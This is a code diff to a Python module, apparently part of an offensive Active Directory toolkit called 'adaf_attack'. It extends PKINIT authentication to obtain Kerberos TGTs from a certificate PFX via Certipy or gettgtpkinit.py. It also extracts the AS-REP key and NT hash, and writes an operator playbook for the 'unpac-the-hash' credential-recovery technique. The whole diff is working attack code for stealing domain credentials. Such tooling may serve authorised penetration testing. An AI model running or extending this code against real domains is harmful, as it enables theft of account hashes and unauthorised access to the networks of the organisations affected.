@@ -187,11 +187,69 @@ class PkinitAuth:
             result["method"] = "certipy-error"
             result["error_certipy"] = str(exc)
 
-        # Method 2: Impacket getTGT PKINIT (if available)
+        # Surface AS-REP key / NT hash when Certipy already printed them.
+        from adaf_attack.core.unpac import parse_asrep_key, parse_nt_hash_from_text
+
+        combined_out = f"{result.get('stdout') or ''}\n{result.get('stderr') or ''}"
+        asrep_key = parse_asrep_key(combined_out)
+        if asrep_key:
+            result["asrep_key"] = asrep_key
+        nt_from_certipy = parse_nt_hash_from_text(combined_out)
+        if nt_from_certipy:
+            result["nt_hash_present"] = True
+            if include_secrets:
+                result["nt_hash"] = nt_from_certipy
+
+        # Method 2: gettgtpkinit.py (PKINITtools) when Certipy did not produce a TGT
+        if not result.get("ok"):
+            import shutil
+
+            gettgt = shutil.which("gettgtpkinit.py") or shutil.which("gettgtpkinit")
+            ccache_out = session.path(f"pkinit-{(identity.split('@')[0])}.ccache")
+            if gettgt:
+                try:
+                    cmd = [
+                        gettgt,
+                        "-cert-pfx",
+                        str(pfx_file),
+                        "-dc-ip",
+                        target.dc_ip,
+                        f"{target.domain}/{identity.split('@')[0]}",
+                        str(ccache_out),
+                    ]
+                    proc = subprocess.run(
+                        cmd,
+                        cwd=str(session.root),
+                        capture_output=True,
+                        text=True,
+                        timeout=120,
+                    )
+                    result["method"] = "gettgtpkinit"
+                    result["returncode"] = proc.returncode
+                    result["gettgtpkinit_stdout"] = (proc.stdout or "")[-2000:]
+                    result["gettgtpkinit_stderr"] = (proc.stderr or "")[-2000:]
+                    gt_out = f"{proc.stdout or ''}\n{proc.stderr or ''}"
+                    asrep_key = parse_asrep_key(gt_out) or asrep_key
+                    if asrep_key:
+                        result["asrep_key"] = asrep_key
+                    if proc.returncode == 0 and ccache_out.exists():
+                        result["ok"] = True
+                        result["ccache"] = str(ccache_out)
+                        record_pre_state(
+                            session,
+                            kind="local-artifact",
+                            target=identity,
+                            artifact=str(ccache_out),
+                            extra={"material": "ccache", "pfx": str(pfx_file)},
+                        )
+                        console.print(f"  [green]TGT via gettgtpkinit[/green] → {ccache_out}")
+                except Exception as exc:
+                    result["error_gettgtpkinit"] = str(exc)
+
+        # Method 3: playbook handoff when neither Certipy nor gettgtpkinit succeeded
         if not result.get("ok"):
             try:
-                result["method"] = result.get("method") or "impacket"
-                # Best-effort: export PFX path + playbook for gettgtpkinit.py
+                result["method"] = result.get("method") or "playbook"
                 playbook = session.path("pkinit.playbook.txt")
                 playbook.write_text(
                     "\n".join(
@@ -203,6 +261,8 @@ class PkinitAuth:
                             f"# or: gettgtpkinit.py -cert-pfx {pfx_file} "
                             f"{target.domain}/{identity.split('@')[0]} {session.path('tgt.ccache')}",
                             f"export KRB5CCNAME={session.path('tgt.ccache')}",
+                            "# Capture the printed AS-REP encryption key for unpac-the-hash "
+                            "(-P asrep_key=<hex>).",
                         ]
                     )
                     + "\n",
@@ -211,12 +271,9 @@ class PkinitAuth:
                 result["playbook"] = str(playbook)
                 result["pfx"] = str(pfx_file)
                 console.print(f"  Playbook → {playbook}")
-                # This block is only reached when certipy did not already
-                # produce a TGT (guarded by `if not result.get("ok")` above),
-                # so the install hint always applies here.
                 console.print(
-                    "  [yellow]Install certipy-ad for in-process PKINIT, "
-                    "or run the playbook.[/yellow]"
+                    "  [yellow]Install certipy-ad or PKINITtools (gettgtpkinit.py) "
+                    "for in-process PKINIT, or run the playbook.[/yellow]"
                 )
             except Exception as exc:
                 result["error"] = str(exc)
